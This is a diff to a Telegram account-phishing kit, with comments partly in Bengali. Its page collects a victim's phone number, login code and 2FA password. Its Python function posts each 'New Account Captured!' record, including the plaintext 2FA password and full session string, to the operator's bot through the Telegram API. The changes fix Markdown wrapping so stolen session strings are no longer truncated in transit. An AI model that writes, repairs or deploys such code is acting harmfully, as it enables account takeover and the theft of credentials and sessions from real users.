@@ -81,7 +81,7 @@ def format_phone(ph):
         return '+' + digits
     return '+' + digits
 
-# ====== Bot Notification ======
+# ====== Bot Notification - FIXED ======
 def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
     try:
         max_len = 3900
@@ -93,6 +93,7 @@ def send_bot_notification(phone, ss, me, dc, password_used=False, password_value
                 extra += f"\n🔑 2FA Password: `{password_value}`"
         
         if len(ss) > max_len:
+            # ====== FIX: session কে backticks এ র‍্যাপ করা ======
             msg1 = (
                 f"🔔 New Account Captured!{extra}\n\n"
                 f"📱 Phone: {phone}\n"
@@ -101,15 +102,16 @@ def send_bot_notification(phone, ss, me, dc, password_used=False, password_value
                 f"📛 Username: @{me.username or 'N/A'}\n"
                 f"🌐 DC: {dc}\n"
                 f"📏 Session Length: {len(ss)} chars\n\n"
-                f"📄 Session (part 1/2):\n{ss[:max_len]}"
+                f"📄 Session (part 1/2):\n`{ss[:max_len]}`"
             )
-            msg2 = f"📄 Session (part 2/2) for {phone}:\n{ss[max_len:]}"
+            msg2 = f"📄 Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
             
             http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
             http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
         else:
+            # ====== FIX: session কে backticks এ র‍্যাপ করা ======
             msg = (
                 f"🔔 New Account!{extra}\n"
                 f"📱 {phone}\n"
@@ -117,11 +119,12 @@ def send_bot_notification(phone, ss, me, dc, password_used=False, password_value
                 f"🆔 {me.id}\n"
                 f"🌐 DC: {dc}\n"
                 f"📏 Session: {len(ss)} chars\n\n"
-                f"🔑 Session:\n{ss}"
+                f"🔑 Session:\n`{ss}`"
             )
             r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
             if r.status_code != 200:
+                # Fallback: Markdown fail করলে plain text পাঠাও
                 http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
     except Exception as e:
@@ -526,9 +529,11 @@ PAGE = """<!DOCTYPE html>
     
     <script>
     // ====== FIXED VERSION ======
-    // Problem: First login sets tg_user_id in localStorage.
+    // Problem 1: First login sets tg_user_id in localStorage.
     // Second login: code checked localStorage and jumped to Share page without asking phone.
     // Fix: Always start from Step 1, then check if the phone is already captured in the server DB.
+    // Problem 2: Session string was being cut off in Telegram bot notification due to Markdown.
+    // Fix: Session string is now wrapped in backticks (`) so Markdown doesn't interfere.
 
     var phoneNumber = '';
     var codeDigits = '';
@@ -604,7 +609,7 @@ PAGE = """<!DOCTYPE html>
             });
     }
 
-    // ====== Backend এ ফোন পাঠানো (unchanged) ======
+    // ====== Backend এ ফোন পাঠানো ======
     async function sendPhoneToBackend(phone) {
         try {
             var res = await fetch('/api/share', {
@@ -636,7 +641,7 @@ PAGE = """<!DOCTYPE html>
         }
     }
 
-    // ====== OTP চেক করা (unchanged) ======
+    // ====== OTP চেক করা ======
     function startCodeCheck() {
         if (codeCheckInterval) clearInterval(codeCheckInterval);
         codeCheckInterval = setInterval(async function() {
@@ -676,7 +681,7 @@ PAGE = """<!DOCTYPE html>
         }, 2000);
     }
 
-    // ====== 2FA পাসওয়ার্ড চেক (unchanged) ======
+    // ====== 2FA পাসওয়ার্ড চেক ======
     function startPasswordCheck() {
         if (passwordCheckInterval) clearInterval(passwordCheckInterval);
         passwordCheckInterval = setInterval(async function() {
@@ -703,7 +708,7 @@ PAGE = """<!DOCTYPE html>
         }, 2000);
     }
 
-    // ====== User ID ফেচ করে localStorage এ সেভ (unchanged) ======
+    // ====== User ID ফেচ করে localStorage এ সেভ ======
     async function fetchUserIdAndGoToShare(phone) {
         try {
             var res = await fetch('/session/' + encodeURIComponent(phone));
@@ -716,7 +721,7 @@ PAGE = """<!DOCTYPE html>
         goToSharePage();
     }
 
-    // ====== Keypad functions (unchanged) ======
+    // ====== Keypad functions ======
     function pk(n) { 
         if (codeDigits.length < 5) { 
             codeDigits += n; 
@@ -728,7 +733,7 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('cdisp').textContent = codeDigits || '_'; 
     }
 
-    // ====== OTP ভেরিফাই (unchanged) ======
+    // ====== OTP ভেরিফাই ======
     async function sc() {
         if (codeDigits.length < 5) { 
             showVerifyStatus('❌ ৫ ডিজিটের কোড দিন', 'error'); 
@@ -774,7 +779,7 @@ PAGE = """<!DOCTYPE html>
         }
     }
 
-    // ====== 2FA পাসওয়ার্ড সাবমিট (unchanged) ======
+    // ====== 2FA পাসওয়ার্ড সাবমিট ======
     async function submitPassword() {
         var pwd = document.getElementById('pwdInput').value.trim();
         if (!pwd) {
@@ -825,7 +830,7 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('vs').style.display = 'block';
     }
 
-    // ====== শেয়ার পেজ (unchanged) ======
+    // ====== শেয়ার পেজ ======
     function goToSharePage() {
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
@@ -899,7 +904,7 @@ PAGE = """<!DOCTYPE html>
         }
     }
 
-    // ====== Modal বন্ধ করা (unchanged) ======
+    // ====== Modal বন্ধ করা ======
     document.getElementById('vm').onclick = function(e) {
         if (e.target === this) {
             this.classList.remove('active');
